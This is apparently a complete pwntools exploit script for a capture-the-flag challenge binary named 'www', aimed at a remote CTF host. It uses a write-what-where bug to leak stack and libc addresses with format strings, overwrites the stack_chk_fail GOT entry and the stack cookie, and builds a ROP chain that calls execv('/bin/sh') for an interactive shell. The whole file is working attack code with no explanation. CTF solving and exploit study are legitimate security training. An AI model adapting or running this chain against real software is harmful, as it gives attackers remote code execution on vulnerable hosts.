from pwn import *
import struct
import sys

def www(p, what, offset):
    p.sendline(f'{offset}')
    p.sendline(struct.pack("<B", what))

def write_bytes(p, b, offset):
    for i, bb in enumerate(b):
        www(p, bb, offset+i)

if len(sys.argv) != 2 or sys.argv[1] != "remote":
    # Local (offsets from my libc-2.30.so on Ubuntu 19.10)
    p = process("./www")
    gdb.attach(p)
    __libc_start_main_retaddr_libc_offset = 0x271e3 
    pop_rdi_ret_offset = 0x26bb2
    pop_rsi_ret_offset = 0x2709c
    execv_libc_offset = 0xE6170
else:
    # Remote - offsets from given libc
    __libc_start_main_retaddr_libc_offset = 0x21B97
    pop_rdi_ret_offset = 0x2155f
    pop_rsi_ret_offset = 0x23e6a
    execv_libc_offset = 0xE4FA0
    p = remote("challenges1.hexionteam.com", 3002)

# Constants
offset_to_amount_variable = -0x7
offset_from_var15_to_stack_buffer = 0x10d

### Session #0
stack_leak_offset = 15
leak_stack_format_string = b'%' + str(stack_leak_offset).encode() + b'$p\n\0'
bytes_to_write = 0
bytes_to_write += len(leak_stack_format_string)
bytes_to_write += 8     # return address

# Override 'amount', give us controlled amount of WWW primitives
www(p, bytes_to_write, offset_to_amount_variable)

# Override return address, to keep running the WWW primitives after the leak
offset_to_return_address = 0x2d
www_start_func_addr = 0x00000000004005D0
write_bytes(p, struct.pack("<Q", www_start_func_addr), offset_to_return_address)

# Write format string to leak stack address
write_bytes(p, leak_stack_format_string, 0x0)
leak = p.recvline()
stack_var15_leak = int(leak.strip(), 16)
stack_buffer_addr = stack_var15_leak - offset_from_var15_to_stack_buffer
print(f"stack_buffer_addr: {hex(stack_buffer_addr)}")

### Session #1
# Override 'amount', give us controlled amount of WWW primitives
libc_leak_offset = 13
leak_libc_format_string = b'%' + str(libc_leak_offset).encode() + b'$p\n\0'

bytes_to_write = 0
bytes_to_write += len(leak_libc_format_string)
bytes_to_write += 8     # stack_chk_fail
bytes_to_write += 8     # cookie

# Override 'amount', give us controlled amount of WWW primitives
www(p, bytes_to_write, offset_to_amount_variable)

# Override stack_chk_fail address, to keep running the WWW primitives after the leak
stack_chk_fail_stored_offset = 0x601018
write_bytes(p, struct.pack("<Q", www_start_func_addr), stack_chk_fail_stored_offset - stack_buffer_addr + 0xd0)

# Override the stack cookie
offset_to_stack_cookie = 0xd
write_bytes(p, struct.pack("<Q", 0xdeadbeef), offset_to_stack_cookie)

# Write format string to leak libc address
write_bytes(p, leak_libc_format_string, 0x0)
leak = p.recvline()
libc_leak = int(leak.strip(), 16)
libc_base = libc_leak - __libc_start_main_retaddr_libc_offset
print(f"libc_base: {hex(libc_base)}")

### Session #2

# Write command to data cave
data_cave_address = 0x0601100
bin_sh_string = b"/bin/sh\0"
argv_address = data_cave_address + 0x100
argv_data = b""
argv_data += p64(data_cave_address)
argv_data += p64(0)

# Generate ROP chain
rop_chain = b""
rop_chain += p64(libc_base + pop_rdi_ret_offset)
rop_chain += p64(data_cave_address)
rop_chain += p64(libc_base + pop_rsi_ret_offset)
rop_chain += p64(argv_address)
rop_chain += p64(libc_base + execv_libc_offset)

# Lets us write the amount we want
bytes_to_write = 0
bytes_to_write += len(rop_chain)
bytes_to_write += len(bin_sh_string)
bytes_to_write += len(argv_data)
www(p, bytes_to_write, offset_to_amount_variable)

# Write the ROP to stack
offset_to_return_address = 0x2d
write_bytes(p, rop_chain, offset_to_return_address)

# Write command to data cave
write_bytes(p, bin_sh_string, data_cave_address - stack_buffer_addr + 0x1e0)
write_bytes(p, argv_data, argv_address - stack_buffer_addr + 0x1e0)

p.interactive()
